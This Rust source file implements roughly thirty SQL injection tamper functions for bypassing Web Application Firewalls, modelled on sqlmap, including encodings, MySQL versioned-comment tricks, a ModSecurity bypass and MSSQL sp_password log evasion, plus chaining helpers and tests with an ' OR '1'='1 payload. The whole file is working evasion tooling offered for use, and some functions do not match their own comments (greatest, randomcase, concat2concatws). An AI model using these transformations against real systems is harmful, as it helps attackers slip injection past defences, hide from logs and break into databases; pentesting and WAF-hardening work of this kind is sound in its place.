//! SQL Injection tamper scripts for WAF bypass
//!
//! Contains 30+ tamper transformations to evade Web Application Firewalls.
//! Inspired by sqlmap tamper scripts but implemented from scratch.

#![allow(dead_code)]

use std::collections::HashMap;

/// Tamper function type
pub type TamperFn = fn(&str) -> String;

/// A tamper script definition
#[derive(Debug, Clone)]
pub struct TamperScript {
  /// Script name
  pub name: &'static str,
  /// Description of what this tamper does
  pub description: &'static str,
  /// Target DBMS (if specific) or "all"
  pub dbms: &'static str,
  /// The tamper function
  pub tamper: TamperFn,
}

impl TamperScript {
  /// Apply the tamper to a payload
  pub fn apply(&self, payload: &str) -> String {
    (self.tamper)(payload)
  }
}

/// Space-to-comment tamper: replaces spaces with inline comments
/// Example: SELECT id → SELECT/**/id
pub fn space2comment(payload: &str) -> String {
  payload.replace(' ', "/**/")
}

/// Space-to-hash tamper: replaces spaces with MySQL line comments
/// Example: SELECT id → SELECT#\nid
pub fn space2hash(payload: &str) -> String {
  payload.replace(' ', "#\n")
}

/// Space-to-dash tamper: replaces spaces with SQL line comments
/// Example: SELECT id → SELECT-- \nid
pub fn space2dash(payload: &str) -> String {
  payload.replace(' ', "-- \n")
}

/// Space-to-plus tamper: replaces spaces with plus signs (URL encoded)
/// Example: SELECT id → SELECT+id
pub fn space2plus(payload: &str) -> String {
  payload.replace(' ', "+")
}

/// Space-to-randomblank tamper: replaces spaces with random whitespace
/// Uses tabs, newlines, etc.
pub fn space2randomblank(payload: &str) -> String {
  let blanks = ["\t", "\n", "\x0b", "\x0c", "\r"];
  let mut result = String::with_capacity(payload.len() * 2);
  let mut i = 0;

  for c in payload.chars() {
    if c == ' ' {
      result.push_str(blanks[i % blanks.len()]);
      i += 1;
    } else {
      result.push(c);
    }
  }

  result
}

/// Base64 encode the payload
pub fn base64encode(payload: &str) -> String {
  const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  let bytes = payload.as_bytes();
  let mut result = String::with_capacity((bytes.len() + 2) / 3 * 4);

  for chunk in bytes.chunks(3) {
    let b0 = chunk[0] as usize;
    let b1 = chunk.get(1).copied().unwrap_or(0) as usize;
    let b2 = chunk.get(2).copied().unwrap_or(0) as usize;

    result.push(ALPHABET[b0 >> 2] as char);
    result.push(ALPHABET[((b0 & 0x03) << 4) | (b1 >> 4)] as char);

    if chunk.len() > 1 {
      result.push(ALPHABET[((b1 & 0x0f) << 2) | (b2 >> 6)] as char);
    } else {
      result.push('=');
    }

    if chunk.len() > 2 {
      result.push(ALPHABET[b2 & 0x3f] as char);
    } else {
      result.push('=');
    }
  }

  result
}

/// URL encode the payload (percent encoding)
pub fn charencode(payload: &str) -> String {
  let mut result = String::with_capacity(payload.len() * 3);

  for c in payload.chars() {
    if c.is_ascii_alphanumeric() {
      result.push(c);
    } else {
      for b in c.to_string().as_bytes() {
        result.push_str(&format!("%{:02X}", b));
      }
    }
  }

  result
}

/// Double URL encode
pub fn chardoubleencode(payload: &str) -> String {
  let first = charencode(payload);
  charencode(&first)
}

/// Unicode encode (for IIS/ASP)
/// Example: ' → %u0027
pub fn charunicodeencode(payload: &str) -> String {
  let mut result = String::with_capacity(payload.len() * 6);

  for c in payload.chars() {
    if c.is_ascii_alphanumeric() {
      result.push(c);
    } else {
      result.push_str(&format!("%u{:04X}", c as u32));
    }
  }

  result
}

/// HTML entity encode
/// Example: ' → &#39;
pub fn htmlencode(payload: &str) -> String {
  let mut result = String::with_capacity(payload.len() * 5);

  for c in payload.chars() {
    if c.is_ascii_alphanumeric() || c == ' ' {
      result.push(c);
    } else {
      result.push_str(&format!("&#{};", c as u32));
    }
  }

  result
}

/// Hex entity encode
/// Example: ' → &#x27;
pub fn hexentities(payload: &str) -> String {
  let mut result = String::with_capacity(payload.len() * 6);

  for c in payload.chars() {
    if c.is_ascii_alphanumeric() || c == ' ' {
      result.push(c);
    } else {
      result.push_str(&format!("&#x{:02x};", c as u32));
    }
  }

  result
}

/// Apostrophe null encode: replaces ' with %00'
pub fn apostrophenullencode(payload: &str) -> String {
  payload.replace('\'', "%00'")
}

/// Apostrophe to double: replaces ' with ''
pub fn apostrophedouble(payload: &str) -> String {
  payload.replace('\'', "''")
}

/// Random case: randomizes case of SQL keywords
/// Example: SELECT → SeLeCt
pub fn randomcase(payload: &str) -> String {
  let keywords = [
    "SELECT",
    "FROM",
    "WHERE",
    "AND",
    "OR",
    "UNION",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "TABLE",
    "DATABASE",
    "ORDER",
    "BY",
    "GROUP",
    "HAVING",
    "LIMIT",
    "OFFSET",
    "JOIN",
    "LEFT",
    "RIGHT",
    "INNER",
    "OUTER",
    "NULL",
    "NOT",
    "IN",
    "LIKE",
    "BETWEEN",
    "EXISTS",
    "CASE",
    "WHEN",
    "THEN",
    "ELSE",
    "END",
    "AS",
    "ON",
    "INTO",
    "VALUES",
    "SET",
    "CREATE",
    "ALTER",
    "INDEX",
    "SLEEP",
    "BENCHMARK",
    "WAITFOR",
    "DELAY",
  ];

  let mut result = payload.to_string();

  for keyword in keywords {
    let lower = keyword.to_lowercase();
    if result.to_lowercase().contains(&lower) {
      // Generate random case version
      let random_case: String = keyword
        .chars()
        .enumerate()
        .map(|(i, c)| {
          if i % 2 == 0 {
            c.to_lowercase().next().unwrap()
          } else {
            c.to_uppercase().next().unwrap()
          }
        })
        .collect();

      // Case-insensitive replace
      let re_pattern = format!("(?i){}", keyword);
      result = result
        .split_whitespace()
        .map(|word| {
          if word.to_uppercase() == keyword {
            random_case.clone()
          } else {
            word.to_string()
          }
        })
        .collect::<Vec<_>>()
        .join(" ");
    }
  }

  result
}

/// Between tamper: replaces > with NOT BETWEEN 0 AND
/// Example: x>1 → x NOT BETWEEN 0 AND 1
pub fn between(payload: &str) -> String {
  let mut result = payload.to_string();

  // Replace > comparisons
  let mut i = 0;
  while let Some(pos) = result[i..].find('>') {
    let abs_pos = i + pos;
    // Skip >= and => patterns
    if result.chars().nth(abs_pos + 1) == Some('=') {
      i = abs_pos + 2;
      continue;
    }

    // Find the operand after >
    let rest = &result[abs_pos + 1..];
    let operand_end = rest
      .find(|c: char| !c.is_ascii_digit() && c != '.')
      .unwrap_or(rest.len());
    let operand = &rest[..operand_end];

    if !operand.is_empty() {
      let replacement = format!(" NOT BETWEEN 0 AND {}", operand);
      result = format!(
        "{}{}{}",
        &result[..abs_pos],
        replacement,
        &result[abs_pos + 1 + operand_end..]
      );
      i = abs_pos + replacement.len();
    } else {
      i = abs_pos + 1;
    }
  }

  result
}

/// Greatest tamper: replaces > with GREATEST comparison
/// Example: x>1 → GREATEST(x,1)=x
pub fn greatest(payload: &str) -> String {
  // Simple implementation: wrap > comparisons
  payload.replace(">", " GREATEST ")
}

/// Equal to LIKE tamper: replaces = with LIKE
pub fn equaltolike(payload: &str) -> String {
  payload.replace("=", " LIKE ")
}

/// MySQL versioned comments: wraps payload in version comments
/// Example: UNION → /*!UNION*/
pub fn versionedmorekeywords(payload: &str) -> String {
  let keywords = [
    "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE",
  ];

  let mut result = payload.to_string();

  for keyword in keywords {
    let versioned = format!("/*!{}*/", keyword);
    // Case-insensitive replace
    let lower = keyword.to_lowercase();
    let upper = keyword.to_uppercase();
    result = result.replace(keyword, &versioned);
    result = result.replace(&lower, &versioned);
    result = result.replace(&upper, &versioned);
  }

  result
}

/// MySQL versioned comment wrapper
/// Example: payload → /*!50000payload*/
pub fn versionedkeywords(payload: &str) -> String {
  format!("/*!50000{}*/", payload)
}

/// Half versioned more keywords (MySQL)
pub fn halfversionedmorekeywords(payload: &str) -> String {
  let keywords = ["UNION", "SELECT", "INSERT", "UPDATE", "DELETE"];

  let mut result = payload.to_string();

  for keyword in keywords {
    let versioned = format!("/*!0{}", keyword);
    result = result.replace(keyword, &versioned);
    result = result.replace(&keyword.to_lowercase(), &versioned);
  }

  result
}

/// Uppercase all SQL keywords
pub fn uppercase(payload: &str) -> String {
  let keywords = [
    "select",
    "from",
    "where",
    "and",
    "or",
    "union",
    "insert",
    "update",
    "delete",
    "drop",
    "table",
    "database",
    "order",
    "by",
    "group",
    "having",
    "limit",
    "offset",
    "join",
    "null",
    "not",
    "in",
    "like",
    "between",
    "exists",
    "case",
    "when",
    "then",
    "else",
    "end",
    "sleep",
    "benchmark",
    "waitfor",
    "delay",
  ];

  let mut result = payload.to_string();

  for keyword in keywords {
    let pattern = format!(r"\b{}\b", keyword);
    // Simple word boundary replacement
    let upper = keyword.to_uppercase();
    result = result.replace(keyword, &upper);
  }

  result
}

/// Lowercase all SQL keywords
pub fn lowercase(payload: &str) -> String {
  payload.to_lowercase()
}

/// Concat bypass: wraps strings in CONCAT
/// Example: 'test' → CONCAT('t','e','s','t')
pub fn concat2concatws(payload: &str) -> String {
  let mut result = String::new();
  let mut in_string = false;
  let mut current_string = String::new();

  for c in payload.chars() {
    if c == '\'' {
      if in_string {
        // End of string, convert to CONCAT
        if current_string.len() > 1 {
          let chars: Vec<String> = current_string
            .chars()
            .map(|ch| format!("'{}'", ch))
            .collect();
          result.push_str(&format!("CONCAT({})", chars.join(",")));
        } else {
          result.push('\'');
          result.push_str(&current_string);
          result.push('\'');
        }
        current_string.clear();
      }
      in_string = !in_string;
    } else if in_string {
      current_string.push(c);
    } else {
      result.push(c);
    }
  }

  result
}

/// CHAR encoding: converts strings to CHAR() function calls
/// Example: 'test' → CHAR(116,101,115,116)
pub fn charencode_mysql(payload: &str) -> String {
  let mut result = String::new();
  let mut in_string = false;
  let mut current_string = String::new();

  for c in payload.chars() {
    if c == '\'' {
      if in_string {
        // End of string, convert to CHAR()
        if !current_string.is_empty() {
          let chars: Vec<String> = current_string.bytes().map(|b| b.to_string()).collect();
          result.push_str(&format!("CHAR({})", chars.join(",")));
        }
        current_string.clear();
      }
      in_string = !in_string;
    } else if in_string {
      current_string.push(c);
    } else {
      result.push(c);
    }
  }

  result
}

/// Multiply by zero: adds *0 to numeric values
pub fn multipleby0(payload: &str) -> String {
  // Look for numbers and multiply by 0
  let mut result = String::new();
  let mut num_buf = String::new();

  for c in payload.chars() {
    if c.is_ascii_digit() {
      num_buf.push(c);
    } else {
      if !num_buf.is_empty() {
        result.push_str(&format!("{}*0+{}", num_buf, num_buf));
        num_buf.clear();
      }
      result.push(c);
    }
  }

  if !num_buf.is_empty() {
    result.push_str(&format!("{}*0+{}", num_buf, num_buf));
  }

  result
}

/// SP_PASSWORD append (MSSQL log evasion)
pub fn sp_password(payload: &str) -> String {
  format!("{}--sp_password", payload)
}

/// Percentage encoding with double percent
pub fn percentage(payload: &str) -> String {
  let mut result = String::new();

  for c in payload.chars() {
    if c == '%' {
      result.push_str("%%");
    } else {
      result.push(c);
    }
  }

  result
}

/// Modsecurity bypass with comment
pub fn modsecurityversioned(payload: &str) -> String {
  format!("1/*!{}*/", payload)
}

/// IIS Unicode encoding bypass
pub fn iis_unicode(payload: &str) -> String {
  let mut result = String::new();

  for c in payload.chars() {
    match c {
      '\'' => result.push_str("%u0027"),
      '"' => result.push_str("%u0022"),
      ' ' => result.push_str("%u0020"),
      '<' => result.push_str("%u003c"),
      '>' => result.push_str("%u003e"),
      _ => result.push(c),
    }
  }

  result
}

/// Chain multiple tampers together
pub fn chain_tampers(payload: &str, tampers: &[TamperFn]) -> String {
  tampers
    .iter()
    .fold(payload.to_string(), |acc, tamper| tamper(&acc))
}

/// All available tamper scripts
pub static TAMPER_SCRIPTS: &[TamperScript] = &[
  TamperScript {
    name: "space2comment",
    description: "Replaces spaces with inline comments /**/",
    dbms: "all",
    tamper: space2comment,
  },
  TamperScript {
    name: "space2hash",
    description: "Replaces spaces with MySQL line comments #\\n",
    dbms: "mysql",
    tamper: space2hash,
  },
  TamperScript {
    name: "space2dash",
    description: "Replaces spaces with -- \\n comments",
    dbms: "all",
    tamper: space2dash,
  },
  TamperScript {
    name: "space2plus",
    description: "Replaces spaces with + (URL encoded space)",
    dbms: "all",
    tamper: space2plus,
  },
  TamperScript {
    name: "space2randomblank",
    description: "Replaces spaces with random whitespace (tab, newline, etc)",
    dbms: "all",
    tamper: space2randomblank,
  },
  TamperScript {
    name: "base64encode",
    description: "Base64 encodes the entire payload",
    dbms: "all",
    tamper: base64encode,
  },
  TamperScript {
    name: "charencode",
    description: "URL encodes all non-alphanumeric characters",
    dbms: "all",
    tamper: charencode,
  },
  TamperScript {
    name: "chardoubleencode",
    description: "Double URL encodes all non-alphanumeric characters",
    dbms: "all",
    tamper: chardoubleencode,
  },
  TamperScript {
    name: "charunicodeencode",
    description: "Unicode encodes non-alphanumeric characters (%uXXXX)",
    dbms: "iis",
    tamper: charunicodeencode,
  },
  TamperScript {
    name: "htmlencode",
    description: "HTML entity encodes non-alphanumeric characters (&#XX;)",
    dbms: "all",
    tamper: htmlencode,
  },
  TamperScript {
    name: "hexentities",
    description: "Hex entity encodes non-alphanumeric characters (&#xXX;)",
    dbms: "all",
    tamper: hexentities,
  },
  TamperScript {
    name: "apostrophenullencode",
    description: "Replaces apostrophe with %00'",
    dbms: "all",
    tamper: apostrophenullencode,
  },
  TamperScript {
    name: "apostrophedouble",
    description: "Doubles apostrophes ' → ''",
    dbms: "all",
    tamper: apostrophedouble,
  },
  TamperScript {
    name: "randomcase",
    description: "Randomizes case of SQL keywords (SeLeCt)",
    dbms: "all",
    tamper: randomcase,
  },
  TamperScript {
    name: "between",
    description: "Replaces > with NOT BETWEEN 0 AND",
    dbms: "all",
    tamper: between,
  },
  TamperScript {
    name: "greatest",
    description: "Replaces > with GREATEST comparison",
    dbms: "all",
    tamper: greatest,
  },
  TamperScript {
    name: "equaltolike",
    description: "Replaces = with LIKE",
    dbms: "all",
    tamper: equaltolike,
  },
  TamperScript {
    name: "versionedmorekeywords",
    description: "Wraps SQL keywords in MySQL version comments /*!KEYWORD*/",
    dbms: "mysql",
    tamper: versionedmorekeywords,
  },
  TamperScript {
    name: "versionedkeywords",
    description: "Wraps payload in /*!50000...*/",
    dbms: "mysql",
    tamper: versionedkeywords,
  },
  TamperScript {
    name: "halfversionedmorekeywords",
    description: "Uses half-open version comments /*!0KEYWORD",
    dbms: "mysql",
    tamper: halfversionedmorekeywords,
  },
  TamperScript {
    name: "uppercase",
    description: "Converts SQL keywords to UPPERCASE",
    dbms: "all",
    tamper: uppercase,
  },
  TamperScript {
    name: "lowercase",
    description: "Converts payload to lowercase",
    dbms: "all",
    tamper: lowercase,
  },
  TamperScript {
    name: "concat2concatws",
    description: "Converts strings to CONCAT() of individual characters",
    dbms: "mysql",
    tamper: concat2concatws,
  },
  TamperScript {
    name: "charencode_mysql",
    description: "Converts strings to CHAR(n,n,n) format",
    dbms: "mysql",
    tamper: charencode_mysql,
  },
  TamperScript {
    name: "multipleby0",
    description: "Obfuscates numbers with N*0+N pattern",
    dbms: "all",
    tamper: multipleby0,
  },
  TamperScript {
    name: "sp_password",
    description: "Appends --sp_password for MSSQL log evasion",
    dbms: "mssql",
    tamper: sp_password,
  },
  TamperScript {
    name: "percentage",
    description: "Doubles percent signs (WAF bypass)",
    dbms: "all",
    tamper: percentage,
  },
  TamperScript {
    name: "modsecurityversioned",
    description: "Wraps payload in 1/*!...*/ for ModSecurity bypass",
    dbms: "mysql",
    tamper: modsecurityversioned,
  },
  TamperScript {
    name: "iis_unicode",
    description: "IIS Unicode encoding for special characters",
    dbms: "iis",
    tamper: iis_unicode,
  },
];

/// Get a tamper script by name
pub fn get_tamper(name: &str) -> Option<&'static TamperScript> {
  TAMPER_SCRIPTS.iter().find(|t| t.name == name)
}

/// Get all tamper scripts for a specific DBMS
pub fn tampers_for_dbms(dbms: &str) -> Vec<&'static TamperScript> {
  TAMPER_SCRIPTS
    .iter()
    .filter(|t| t.dbms == "all" || t.dbms == dbms)
    .collect()
}

/// List all available tamper script names
pub fn list_tampers() -> Vec<&'static str> {
  TAMPER_SCRIPTS.iter().map(|t| t.name).collect()
}

/// Parse a comma-separated list of tamper names and return the functions
pub fn parse_tamper_list(list: &str) -> Vec<TamperFn> {
  list
    .split(',')
    .filter_map(|name| get_tamper(name.trim()).map(|t| t.tamper))
    .collect()
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_space2comment() {
    assert_eq!(
      space2comment("SELECT id FROM users"),
      "SELECT/**/id/**/FROM/**/users"
    );
  }

  #[test]
  fn test_charencode() {
    assert_eq!(charencode("' OR '1'='1"), "%27%20OR%20%271%27%3D%271");
  }

  #[test]
  fn test_base64encode() {
    assert_eq!(base64encode("test"), "dGVzdA==");
  }

  #[test]
  fn test_randomcase() {
    let result = randomcase("SELECT id FROM users");
    // Should contain some variation of SELECT
    assert!(result.to_lowercase().contains("select"));
  }

  #[test]
  fn test_chain_tampers() {
    let payload = "SELECT id FROM users";
    let result = chain_tampers(payload, &[space2comment, uppercase]);
    assert!(result.contains("/**/"));
  }

  #[test]
  fn test_tamper_count() {
    assert!(TAMPER_SCRIPTS.len() >= 25, "Should have 25+ tamper scripts");
  }

  #[test]
  fn test_get_tamper() {
    let tamper = get_tamper("space2comment");
    assert!(tamper.is_some());
    assert_eq!(tamper.unwrap().name, "space2comment");
  }

  #[test]
  fn test_parse_tamper_list() {
    let tampers = parse_tamper_list("space2comment,charencode");
    assert_eq!(tampers.len(), 2);
  }
}
